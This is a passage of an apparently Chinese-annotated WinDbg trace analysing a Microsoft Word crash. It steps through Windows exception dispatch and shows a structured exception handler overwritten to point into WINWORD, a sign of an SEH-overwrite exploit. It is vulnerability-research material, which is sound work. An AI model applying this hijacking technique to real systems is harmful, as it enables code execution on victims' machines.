class="built_in">esi</span>,<span class="built_in">esi</span></span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; </span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=<span class="number">00000000</span> <span class="built_in">ecx</span>=0000e085 <span class="built_in">edx</span>=7c9232bc <span class="built_in">esi</span>=<span class="number">00000000</span> <span class="built_in">edi</span>=<span class="number">00130000</span></span><br><span class="line"><span class="built_in">eip</span>=7c92325f <span class="built_in">esp</span>=<span class="number">00123420</span> <span class="built_in">ebp</span>=001234b4 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">ntdll!ExecuteHandler+<span class="number">0x9</span>:</span><br><span class="line">7c92325f 33ff            <span class="keyword">xor</span>     <span class="built_in">edi</span>,<span class="built_in">edi</span></span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; </span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=<span class="number">00000000</span> <span class="built_in">ecx</span>=0000e085 <span class="built_in">edx</span>=7c9232bc <span class="built_in">esi</span>=<span class="number">00000000</span> <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=7c923261 <span class="built_in">esp</span>=<span class="number">00123420</span> <span class="built_in">ebp</span>=001234b4 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">ntdll!ExecuteHandler+<span class="number">0xb</span>:</span><br><span class="line">7c923261 ff742420        <span class="keyword">push</span>    <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">esp</span>+<span class="number">20h</span>]  <span class="built_in">ss</span>:<span class="number">0023</span>:<span class="number">00123440</span>=30001bdd</span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=<span class="number">00000000</span> <span class="built_in">ecx</span>=0000e085 <span class="built_in">edx</span>=7c9232bc <span class="built_in">esi</span>=<span class="number">00000000</span> <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=7c923265 <span class="built_in">esp</span>=0012341c <span class="built_in">ebp</span>=001234b4 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">ntdll!ExecuteHandler+<span class="number">0xf</span>:</span><br><span class="line">7c923265 ff742420        <span class="keyword">push</span>    <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">esp</span>+<span class="number">20h</span>]  <span class="built_in">ss</span>:<span class="number">0023</span>:0012343c=001234a0</span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; </span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=<span class="number">00000000</span> <span class="built_in">ecx</span>=0000e085 <span class="built_in">edx</span>=7c9232bc <span class="built_in">esi</span>=<span class="number">00000000</span> <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=7c923269 <span class="built_in">esp</span>=<span class="number">00123418</span> <span class="built_in">ebp</span>=001234b4 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">ntdll!ExecuteHandler+<span class="number">0x13</span>:</span><br><span class="line">7c923269 ff742420        <span class="keyword">push</span>    <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">esp</span>+<span class="number">20h</span>]  <span class="built_in">ss</span>:<span class="number">0023</span>:<span class="number">00123438</span>=001234e8</span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; </span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=<span class="number">00000000</span> <span class="built_in">ecx</span>=0000e085 <span class="built_in">edx</span>=7c9232bc <span class="built_in">esi</span>=<span class="number">00000000</span> <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=7c92326d <span class="built_in">esp</span>=<span class="number">00123414</span> <span class="built_in">ebp</span>=001234b4 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">ntdll!ExecuteHandler+<span class="number">0x17</span>:</span><br><span class="line">7c92326d ff742420        <span class="keyword">push</span>    <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">esp</span>+<span class="number">20h</span>]  <span class="built_in">ss</span>:<span class="number">0023</span>:<span class="number">00123434</span>=0012ffb0</span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; </span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=<span class="number">00000000</span> <span class="built_in">ecx</span>=0000e085 <span class="built_in">edx</span>=7c9232bc <span class="built_in">esi</span>=<span class="number">00000000</span> <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=7c923271 <span class="built_in">esp</span>=<span class="number">00123410</span> <span class="built_in">ebp</span>=001234b4 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">ntdll!ExecuteHandler+<span class="number">0x1b</span>:</span><br><span class="line">7c923271 ff742420        <span class="keyword">push</span>    <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">esp</span>+<span class="number">20h</span>]  <span class="built_in">ss</span>:<span class="number">0023</span>:<span class="number">00123430</span>=001234cc</span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; </span><br><span class="line">Breakpoint <span class="number">4</span> hit</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=<span class="number">00000000</span> <span class="built_in">ecx</span>=0000e085 <span class="built_in">edx</span>=7c9232bc <span class="built_in">esi</span>=<span class="number">00000000</span> <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=7c923275 <span class="built_in">esp</span>=0012340c <span class="built_in">ebp</span>=001234b4 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">ntdll!ExecuteHandler+<span class="number">0x1f</span>:</span><br><span class="line">7c923275 e808000000      <span class="keyword">call</span>    ntdll!ExecuteHandler2 (7c923282)</span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; <span class="built_in">dd</span> <span class="built_in">esp</span></span><br><span class="line">0012340c  001234cc 0012ffb0 001234e8 001234a0</span><br><span class="line">0012341c  30001bdd <span class="number">00130000</span> 001234cc 0012ffb0</span><br><span class="line">0012342c  7c94a9ef 001234cc 0012ffb0 001234e8</span><br><span class="line">0012343c  001234a0 30001bdd <span class="number">00130000</span> 001234cc</span><br><span class="line">0012344c  1104c830 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">0012345c  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">0012346c  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">0012347c  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; t</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=<span class="number">00000000</span> <span class="built_in">ecx</span>=0000e085 <span class="built_in">edx</span>=7c9232bc <span class="built_in">esi</span>=<span class="number">00000000</span> <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=7c923282 <span class="built_in">esp</span>=<span class="number">00123408</span> <span class="built_in">ebp</span>=001234b4 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">ntdll!ExecuteHandler2:</span><br><span class="line">7c923282 <span class="number">55</span>              <span class="keyword">push</span>    <span class="built_in">ebp</span></span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=<span class="number">00000000</span> <span class="built_in">ecx</span>=0000e085 <span class="built_in">edx</span>=7c9232bc <span class="built_in">esi</span>=<span class="number">00000000</span> <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=7c923283 <span class="built_in">esp</span>=<span class="number">00123404</span> <span class="built_in">ebp</span>=001234b4 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">ntdll!ExecuteHandler2+<span class="number">0x1</span>:</span><br><span class="line">7c923283 8bec            <span class="keyword">mov</span>     <span class="built_in">ebp</span>,<span class="built_in">esp</span></span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; </span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=<span class="number">00000000</span> <span class="built_in">ecx</span>=0000e085 <span class="built_in">edx</span>=7c9232bc <span class="built_in">esi</span>=<span class="number">00000000</span> <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=7c923285 <span class="built_in">esp</span>=<span class="number">00123404</span> <span class="built_in">ebp</span>=<span class="number">00123404</span> iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">ntdll!ExecuteHandler2+<span class="number">0x3</span>:</span><br><span class="line">7c923285 ff750c          <span class="keyword">push</span>    <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>+<span class="number">0Ch</span>]  <span class="built_in">ss</span>:<span class="number">0023</span>:<span class="number">00123410</span>=0012ffb0</span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=<span class="number">00000000</span> <span class="built_in">ecx</span>=0000e085 <span class="built_in">edx</span>=7c9232bc <span class="built_in">esi</span>=<span class="number">00000000</span> <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=7c923288 <span class="built_in">esp</span>=<span class="number">00123400</span> <span class="built_in">ebp</span>=<span class="number">00123404</span> iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">ntdll!ExecuteHandler2+<span class="number">0x6</span>:</span><br><span class="line">7c923288 <span class="number">52</span>              <span class="keyword">push</span>    <span class="built_in">edx</span> &lt;---- ERR-&gt;Handler</span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; </span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=<span class="number">00000000</span> <span class="built_in">ecx</span>=0000e085 <span class="built_in">edx</span>=7c9232bc <span class="built_in">esi</span>=<span class="number">00000000</span> <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=7c923289 <span class="built_in">esp</span>=001233fc <span class="built_in">ebp</span>=<span class="number">00123404</span> iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">ntdll!ExecuteHandler2+<span class="number">0x7</span>:</span><br><span class="line">7c923289 64ff3500000000  <span class="keyword">push</span>    <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">fs</span>:[<span class="number">0</span>]     <span class="built_in">fs</span>:003b:<span class="number">00000000</span>=0012ffb0 &lt;---- ERR-&gt;Next</span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; </span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=<span class="number">00000000</span> <span class="built_in">ecx</span>=0000e085 <span class="built_in">edx</span>=7c9232bc <span class="built_in">esi</span>=<span class="number">00000000</span> <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=7c923290 <span class="built_in">esp</span>=001233f8 <span class="built_in">ebp</span>=<span class="number">00123404</span> iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">ntdll!ExecuteHandler2+<span class="number">0xe</span>:</span><br><span class="line">7c923290 <span class="number">64892500000000</span>  <span class="keyword">mov</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">fs</span>:[<span class="number">0</span>],<span class="built_in">esp</span> <span class="built_in">fs</span>:003b:<span class="number">00000000</span>=0012ffb0 &lt;---- 当前SEH链表头部</span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; </span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=<span class="number">00000000</span> <span class="built_in">ecx</span>=0000e085 <span class="built_in">edx</span>=7c9232bc <span class="built_in">esi</span>=<span class="number">00000000</span> <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=7c923297 <span class="built_in">esp</span>=001233f8 <span class="built_in">ebp</span>=<span class="number">00123404</span> iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">ntdll!ExecuteHandler2+<span class="number">0x15</span>:</span><br><span class="line">7c923297 ff7514          <span class="keyword">push</span>    <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>+<span class="number">14h</span>]  <span class="built_in">ss</span>:<span class="number">0023</span>:<span class="number">00123418</span>=001234a0</span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; <span class="built_in">dd</span> <span class="built_in">esp</span></span><br><span class="line">001233f8  0012ffb0 7c9232bc 0012ffb0 001234b4</span><br><span class="line"><span class="number">00123408</span>  7c92327a 001234cc 0012ffb0 001234e8</span><br><span class="line"><span class="number">00123418</span>  001234a0 30001bdd <span class="number">00130000</span> 001234cc</span><br><span class="line"><span class="number">00123428</span>  0012ffb0 7c94a9ef 001234cc 0012ffb0</span><br><span class="line"><span class="number">00123438</span>  001234e8 001234a0 30001bdd <span class="number">00130000</span></span><br><span class="line"><span class="number">00123448</span>  001234cc 1104c830 <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"><span class="number">00123458</span>  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"><span class="number">00123468</span>  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; <span class="built_in">dt</span> _EXCEPTION_REGISTRATION_RECORD 001233f8</span><br><span class="line">ntdll!_EXCEPTION_REGISTRATION_RECORD</span><br><span class="line">   +<span class="number">0x000</span> Next             : <span class="number">0x0012ffb0</span> _EXCEPTION_REGISTRATION_RECORD</span><br><span class="line">   +<span class="number">0x004</span> Handler          : <span class="number">0x7c9232bc</span>     _EXCEPTION_DISPOSITION  ntdll!ExecuteHandler2+<span class="number">0</span></span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=<span class="number">00000000</span> <span class="built_in">ecx</span>=0000e085 <span class="built_in">edx</span>=7c9232bc <span class="built_in">esi</span>=<span class="number">00000000</span> <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=7c92329a <span class="built_in">esp</span>=001233f4 <span class="built_in">ebp</span>=<span class="number">00123404</span> iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">ntdll!ExecuteHandler2+<span class="number">0x18</span>:</span><br><span class="line">7c92329a ff7510          <span class="keyword">push</span>    <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>+<span class="number">10h</span>]  <span class="built_in">ss</span>:<span class="number">0023</span>:<span class="number">00123414</span>=001234e8</span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; </span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=<span class="number">00000000</span> <span class="built_in">ecx</span>=0000e085 <span class="built_in">edx</span>=7c9232bc <span class="built_in">esi</span>=<span class="number">00000000</span> <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=7c92329d <span class="built_in">esp</span>=001233f0 <span class="built_in">ebp</span>=<span class="number">00123404</span> iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">ntdll!ExecuteHandler2+<span class="number">0x1b</span>:</span><br><span class="line">7c92329d ff750c          <span class="keyword">push</span>    <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>+<span class="number">0Ch</span>]  <span class="built_in">ss</span>:<span class="number">0023</span>:<span class="number">00123410</span>=0012ffb0</span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; </span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=<span class="number">00000000</span> <span class="built_in">ecx</span>=0000e085 <span class="built_in">edx</span>=7c9232bc <span class="built_in">esi</span>=<span class="number">00000000</span> <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=7c9232a0 <span class="built_in">esp</span>=001233ec <span class="built_in">ebp</span>=<span class="number">00123404</span> iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">ntdll!ExecuteHandler2+<span class="number">0x1e</span>:</span><br><span class="line">7c9232a0 ff7508          <span class="keyword">push</span>    <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>+<span class="number">8</span>]    <span class="built_in">ss</span>:<span class="number">0023</span>:0012340c=001234cc</span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; </span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=<span class="number">00000000</span> <span class="built_in">ecx</span>=0000e085 <span class="built_in">edx</span>=7c9232bc <span class="built_in">esi</span>=<span class="number">00000000</span> <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=7c9232a3 <span class="built_in">esp</span>=001233e8 <span class="built_in">ebp</span>=<span class="number">00123404</span> iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">ntdll!ExecuteHandler2+<span class="number">0x21</span>:</span><br><span class="line">7c9232a3 8b4d18          <span class="keyword">mov</span>     <span class="built_in">ecx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>+<span class="number">18h</span>] <span class="built_in">ss</span>:<span class="number">0023</span>:0012341c=30001bdd</span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; </span><br><span class="line">Breakpoint <span class="number">5</span> hit</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=<span class="number">00000000</span> <span class="built_in">ecx</span>=30001bdd <span class="built_in">edx</span>=7c9232bc <span class="built_in">esi</span>=<span class="number">00000000</span> <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=7c9232a6 <span class="built_in">esp</span>=001233e8 <span class="built_in">ebp</span>=<span class="number">00123404</span> iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">ntdll!ExecuteHandler2+<span class="number">0x24</span>:</span><br><span class="line">7c9232a6 ffd1            <span class="keyword">call</span>    <span class="built_in">ecx</span> &#123;WINWORD+<span class="number">0x1bdd</span> (30001bdd)&#125;</span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; <span class="built_in">dd</span> <span class="built_in">esp</span></span><br><span class="line">001233e8  001234cc 0012ffb0 001234e8 001234a0</span><br><span class="line">001233f8  0012ffb0 7c9232bc 0012ffb0 001234b4</span><br><span class="line"><span class="number">00123408</span>  7c92327a 001234cc 0012ffb0 001234e8</span><br><span class="line"><span class="number">00123418</span>  001234a0 30001bdd <span class="number">00130000</span> 001234cc</span><br><span class="line"><span class="number">00123428</span>  0012ffb0 7c94a9ef 001234cc 0012ffb0</span><br><span class="line"><span class="number">00123438</span>  001234e8 001234a0 30001bdd <span class="number">00130000</span></span><br><span class="line"><span class="number">00123448</span>  001234cc 1104c830 <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"><span class="number">00123458</span>  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; <span class="built_in">dt</span> _EXCEPTION_RECORD 001234cc</span><br><span class="line">ntdll!_EXCEPTION_RECORD</span><br><span class="line">   +<span class="number">0x000</span> ExceptionCode    : 0n-<span class="number">1073741819</span> &lt;---- <span class="number">16</span>进制补码(C0000005),EXCEPTION_INVALID_VIOLATION,读写内存违规</span><br><span class="line">   +<span class="number">0x004</span> ExceptionFlags   : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x008</span> ExceptionRecord  : (null) </span><br><span class="line">   +<span class="number">0x00c</span> ExceptionAddress : <span class="number">0x30ed442c</span> Void &lt;---- 发生异常的指令地址</span><br><span class="line">   +<span class="number">0x010</span> NumberParameters : <span class="number">2</span></span><br><span class="line">   +<span class="number">0x014</span> ExceptionInformation : [<span class="number">15</span>] <span class="number">1</span></span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; <span class="built_in">dt</span> _EXCEPTION_REGISTRATION_RECORD 0012ffb0</span><br><span class="line">ntdll!_EXCEPTION_REGISTRATION_RECORD</span><br><span class="line">   +<span class="number">0x000</span> Next             : <span class="number">0xa29706eb</span> _EXCEPTION_REGISTRATION_RECORD</span><br><span class="line">   +<span class="number">0x004</span> Handler          : <span class="number">0x30001bdd</span>     _EXCEPTION_DISPOSITION  +<span class="number">0</span></span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; <span class="built_in">dt</span> _CONTEXT 001234e8 </span><br><span class="line">ntdll!_CONTEXT</span><br><span class="line">   +<span class="number">0x000</span> ContextFlags     : <span class="number">0x1003f</span></span><br><span class="line">   +<span class="number">0x004</span> <span class="built_in">Dr0</span>              : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x008</span> <span class="built_in">Dr1</span>              : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x00c</span> <span class="built_in">Dr2</span>              : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x010</span> <span class="built_in">Dr3</span>              : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x014</span> Dr6              : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x018</span> Dr7              : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x01c</span> FloatSave        : _FLOATING_SAVE_AREA</span><br><span class="line">   +<span class="number">0x08c</span> SegGs            : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x090</span> SegFs            : <span class="number">0x3b</span></span><br><span class="line">   +<span class="number">0x094</span> SegEs            : <span class="number">0x23</span></span><br><span class="line">   +<span class="number">0x098</span> SegDs            : <span class="number">0x23</span></span><br><span class="line">   +<span class="number">0x09c</span> <span class="built_in">Edi</span>              : <span class="number">0x130000</span></span><br><span class="line">   +<span class="number">0x0a0</span> <span class="built_in">Esi</span>              : <span 